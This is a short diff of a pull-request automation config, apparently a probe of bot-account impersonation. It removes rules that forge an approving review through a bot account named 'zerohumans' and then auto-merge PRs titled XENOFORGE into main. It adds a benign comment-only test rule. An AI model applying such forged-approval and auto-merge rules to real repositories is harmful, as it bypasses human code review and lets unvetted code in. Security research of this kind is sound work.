@@ -1,18 +1,8 @@
 pull_request_rules:
-  - name: xeno-forge
+  - name: fork-trigger
     conditions:
-      - base=main
-      - title~=XENOFORGE
+      - title~=XENOPROBE
     actions:
-      review:
-        type: APPROVE
-        message: "XENOFORGE forged approval via bot_account"
+      comment:
+        message: "XENOPROBE: this comment is attributed to bot_account (zerohumans)"
         bot_account: zerohumans
-  - name: xeno-merge
-    conditions:
-      - base=main
-      - title~=XENOFORGE
-      - "#approved-reviews-by >= 1"
-    actions:
-      merge:
-        method: merge
